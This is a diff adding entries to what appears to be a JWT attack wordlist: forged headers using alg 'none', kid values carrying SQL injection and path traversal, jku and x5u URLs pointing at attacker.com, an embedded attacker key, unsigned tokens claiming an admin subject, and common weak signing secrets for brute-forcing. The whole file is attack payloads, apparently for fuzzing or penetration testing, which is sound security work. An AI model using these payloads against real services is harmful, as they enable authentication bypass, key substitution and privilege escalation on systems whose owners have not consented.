@@ -1,3 +1,26 @@
+""
+{"alg":"HS256","kid":"' union select 'secret'--"}
+{"alg":"HS256","kid":"../../dev/null"}
+{"alg":"HS256","kid":"/dev/null"}
+{"alg":"HS256","kid":"key|id; drop table keys;--"}
+{"alg":"none","typ":"JWT"}
+{"alg":"NONE"}
+{"alg":"RS256","jku":"https://attacker.com/jwks.json"}
+{"alg":"RS256","jwk":{"kty":"RSA","kid":"attacker","n":"...","e":"AQAB"}}
+{"alg":"RS256","x5u":"https://attacker.com/cert.pem"}
+123456
+admin
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.
+eyJhbGciOiJOT05FIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
 eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.
+eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.
 eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.
+hs256
+jwt_secret
+key
+password
+secret
+test
